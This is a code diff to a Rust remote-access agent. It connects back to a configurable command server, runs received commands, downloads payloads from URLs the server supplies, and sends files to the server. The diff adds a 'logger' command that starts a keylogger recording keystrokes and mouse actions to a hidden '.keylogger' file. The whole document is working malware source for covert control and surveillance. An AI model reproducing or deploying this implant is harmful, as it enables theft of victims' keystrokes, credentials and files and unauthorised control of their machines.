@@ -2,6 +2,10 @@ use std::net::{Ipv4Addr,SocketAddrV4,TcpListener,TcpStream,Shutdown};
 use std::process::{Command,exit};
 use std::io::{self, Write, BufReader, BufRead};
 use std::process::Output;
+use std::env;
+
+use clap::{App, Arg};
+mod keylogger;
 
 fn executecmd(cmd: &str) -> String {
     let client_os: (&str, &str);
@@ -190,21 +194,27 @@ pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(),
 
 #[tokio::main]
 async fn main() {
-    // set ip address and port here
-    let mut ipaddy = "192.168.56.102".to_string();
-    let port = "5358".to_string();
+    let ipaddy = match env::var("AGENT_IP") {
+        Ok(val) => val,
+        Err(_) => "127.0.0.1".to_string(),
+    };
+    let port = match env::var("AGENT_PORT") {
+        Ok(val) => val,
+        Err(_) => "9001".to_string(),
+    };
+    println!("Your agent is looking to connect back to: {}", ipaddy);
+    println!("With port: {}", port);
     let port2 = "9001".to_string(); // for tx and rx of files
     
     let serveraddress = format!("{}:{}",ipaddy,port);
-    let serveraddresstx = format!("{}:{}",ipaddy,port2);
     let mut client =TcpStream::connect(serveraddress).unwrap();
     println!("Connected to: {}", client.peer_addr().unwrap());
-
+    
     loop{
         let mut buffer:Vec<u8> = Vec::new();
         let mut reader = BufReader::new(&client);
         reader.read_until(b'\0', &mut buffer);
-        println!("reciever from server: {}", String::from_utf8_lossy(&buffer).trim());
+        println!("recieved from server: {}", String::from_utf8_lossy(&buffer).trim());
         let text : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
         
         if buffer.len()==0 ||
@@ -217,18 +227,15 @@ async fn main() {
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
-            println!("reciever from server in dl 1: {}", String::from_utf8_lossy(&buffer).trim());
             let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            println!("ooutput dl url capture check: {}", urltext);
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
-            println!("reciever from server in dl mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
+            println!("recieved from server in dl mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
             let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            //println!("ooutput dl fn capture check: {}", fntext);
             println!("downloading files...");
             download_file(&Client::new(), &urltext, &fntext).await.unwrap();
-            println!("Files downloaded...");
+            println!("files downloaded...");
         }
 
         else if &text=="tx"{ //downloading from server 
@@ -238,7 +245,7 @@ async fn main() {
             let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
             println!("recieving files... {}", fntext);
             handle_client_tx(&mut client, &fntext);
-            println!("Files downloaded...");
+            println!("files downloaded...");
             let mut output =String::from("").to_string();
             output.push('\0');
             client.write(&mut output.as_bytes());
@@ -248,12 +255,19 @@ async fn main() {
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
-            println!("reciever from server in tx 1: {}", String::from_utf8_lossy(&buffer).trim());
             let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            println!("reciever from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
+            println!("recieved from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
             println!("sending files...");
             send_to_server(&mut client, &fntext);
             println!("sent to server...");
+        }
+        
+        else if &text=="logger"{ //start logging
+            let mut buffer:Vec<u8> = Vec::new();
+            println!("recieved from server in logger mode 1: {}", String::from_utf8_lossy(&buffer).trim());
+            println!("starting logger ...");
+            startlog();
+            continue;
         }
         
         else {
@@ -264,3 +278,21 @@ async fn main() {
     }
     client.shutdown(Shutdown::Both);
 }
+
+async fn startlog() {
+    let matches = App::new("keylogger")
+        .version("0.1.2")
+        .author("yourcomputer")
+        .about("Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes")
+        .arg(
+            Arg::with_name("PATH")
+                .help("File path")
+                .index(1),
+        )
+        .get_matches();
+
+    let path = matches.value_of("PATH").unwrap_or(".keylogger");
+
+    keylogger::run(String::from(path));
+}
+
